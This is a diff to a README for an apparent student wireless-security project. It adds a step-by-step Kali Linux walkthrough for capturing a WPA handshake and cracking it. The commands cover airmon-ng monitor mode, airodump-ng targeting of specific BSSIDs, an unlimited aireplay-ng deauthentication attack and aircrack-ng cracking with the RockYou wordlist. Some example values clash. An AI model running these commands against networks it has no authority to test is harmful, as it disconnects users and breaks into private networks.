@@ -16,37 +16,81 @@ The goal is to capture WPA handshake packets and perform password strength analy
 
 ## Project Workflow
 
-### 1. Enable Monitor Mode
-
-The wireless adapter was switched to monitor mode to capture raw network packets.
-
-```
+Commands Used
+Check Kali Version
+cat /etc/os-release
+uname -a
+View Network Interfaces
+ip addr
+iwconfig
+Kill Conflicting Processes
+sudo airmon-ng check kill
+Start Monitor Mode
 sudo airmon-ng start wlan0
-```
+Verify Monitor Mode
+sudo airmon-ng
+iwconfig
+Scan for Available Networks
 
-### 2. Scan Available Networks
+Use airodump-ng to detect nearby wireless access points.
 
-Nearby wireless networks were scanned to identify targets and monitor their traffic.
+sudo airodump-ng wlan0mon
 
-```
-sudo airodump-ng wlan0
-```
+From this scan note the following information:
 
-### 3. Capture WPA Handshake
+BSSID (AP MAC Address)
 
-A specific network was monitored to capture the WPA authentication handshake.
+Channel
 
-### 4. Deauthentication Test
+ESSID
 
-Aireplay-ng can be used to trigger reconnection events so the handshake can be captured.
+Example:
 
-### 5. Password Security Testing
+ESSID: 90:9A:4A:B8:F3:FB
+Channel used by AP: 2
+Capture WPA Handshake
 
-Aircrack-ng tests captured handshakes against a password list.
+Open a new terminal window and run:
 
-```
-aircrack-ng capture.cap -w wordlist.txt
-```
+sudo airodump-ng -w hack1 -c 2 --bssid C2:A5:E8:39:05:85 wlan0mon
+
+Explanation:
+
+-w hack1 → output file name
+
+-c → channel number
+
+--bssid → target access point MAC address
+
+Deauthentication Attack (Trigger Handshake)
+
+In another terminal window run:
+
+sudo aireplay-ng --deauth 0 -a 36:6A:34:58:D5:AF wlan0
+
+This forces connected devices to reconnect, allowing capture of the WPA handshake.
+
+Inspect Capture with Wireshark
+
+Open the captured file:
+
+wireshark hack1-01.cap
+
+Filter handshake packets:
+
+eapol
+
+If handshake packets appear, the capture was successful.
+
+Stop Monitor Mode
+airmon-ng stop wlan0mon
+Crack the Handshake
+
+Use Aircrack-ng with the RockYou wordlist.
+
+aircrack-ng hack1-01.cap -w /usr/share/wordlists/rockyou.txt
+Target Specific Access Point
+sudo airodump-ng wlan0 -d C2:A5:E8:39:05:85
 
 ## Learning Outcomes
 
